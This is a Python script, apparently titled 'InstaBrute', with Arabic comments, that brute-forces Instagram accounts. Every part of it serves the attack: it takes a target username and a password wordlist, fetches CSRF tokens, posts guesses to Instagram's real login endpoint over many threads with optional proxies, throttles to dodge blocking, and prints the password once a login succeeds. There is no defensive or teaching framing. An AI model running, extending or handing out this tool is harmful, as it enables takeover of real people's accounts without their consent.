#!/usr/bin/env python3
"""
InstaBrute - نسخة نظيفة وقابلة للتعديل (بدون تشفير)
"""

import requests
import time
import threading
import argparse
from queue import Queue

# الإعدادات الأساسية
BASE_URL = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
USER_AGENT = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"

class InstaBrute:
    def __init__(self, username, password_list, threads=10, proxy=None):
        self.username = username
        self.password_list = password_list
        self.threads = threads
        self.proxy = proxy
        self.queue = Queue()
        self.found = False
        self.lock = threading.Lock()

    def load_passwords(self):
        with open(self.password_list, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                self.queue.put(line.strip())

    def get_csrf_token(self):
        # استخراج توكن CSRF من الصفحة الرئيسية
        session = requests.Session()
        session.headers.update({'User-Agent': USER_AGENT})
        try:
            resp = session.get('https://www.instagram.com/', proxies=self.proxy)
            for cookie in session.cookies:
                if cookie.name == 'csrftoken':
                    return cookie.value
        except:
            pass
        return None

    def try_login(self, password):
        if self.found:
            return
        csrf = self.get_csrf_token()
        if not csrf:
            with self.lock:
                print(f"[!] فشل في الحصول على CSRF لـ {password}")
            return

        session = requests.Session()
        session.headers.update({
            'User-Agent': USER_AGENT,
            'X-CSRFToken': csrf,
            'Referer': 'https://www.instagram.com/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        session.cookies.set('csrftoken', csrf)

        data = {
            'username': self.username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }

        try:
            resp = session.post(BASE_URL, data=data, proxies=self.proxy, timeout=10)
            result = resp.json()
            if result.get('authenticated'):
                with self.lock:
                    print(f"\n[✔] ✅ نجاح! كلمة المرور: {password}")
                    self.found = True
            elif 'checkpoint_required' in str(result) or 'challenge' in str(result):
                with self.lock:
                    print(f"[!] ⚠️ تم طلب تحقق إضافي لـ {password}")
            else:
                with self.lock:
                    print(f"[-] ✖ فشل: {password}")
        except Exception as e:
            with self.lock:
                print(f"[!] خطأ في الاتصال: {e}")

    def worker(self):
        while not self.queue.empty() and not self.found:
            pwd = self.queue.get()
            self.try_login(pwd)
            time.sleep(0.5)  # تأخير لتجنب الحظر

    def run(self):
        print(f"[*] بدء الهجوم على {self.username}")
        self.load_passwords()
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        if not self.found:
            print("[✘] لم يتم العثور على كلمة مرور صحيحة.")

def main():
    parser = argparse.ArgumentParser(description="InstaBrute - نسخة نظيفة")
    parser.add_argument("--username", required=True, help="اسم المستخدم المستهدف")
    parser.add_argument("--password-list", required=True, help="مسار ملف كلمات المرور")
    parser.add_argument("--threads", type=int, default=10, help="عدد الخيوط (افتراضي 10)")
    parser.add_argument("--proxy", help="بروكسي (مثل http://127.0.0.1:8080)")
    args = parser.parse_args()

    proxy = None
    if args.proxy:
        proxy = {'http': args.proxy, 'https': args.proxy}

    brute = InstaBrute(args.username, args.password_list, args.threads, proxy)
    brute.run()

if __name__ == "__main__":
    main()
